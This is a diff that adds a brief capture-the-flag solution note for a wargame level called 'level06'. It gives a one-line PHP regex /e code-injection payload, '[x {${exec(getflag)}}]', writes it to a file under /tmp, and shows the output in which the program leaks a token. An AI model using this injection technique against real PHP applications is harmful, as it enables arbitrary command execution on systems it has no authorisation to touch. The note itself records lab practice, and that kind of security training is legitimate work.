@@ -1,0 +1,11 @@
+create a file to pass as param to level06 who contain an exec("getflag") instruction, since level06 replace some text we need to do it  like this
+
+```
+echo '[x {${exec(getflag)}}]' > /tmp/file ; ./level06 /tmp/file /tmp/file
+```
+output :
+```
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+Doesn't work be I don't care it got my token :D
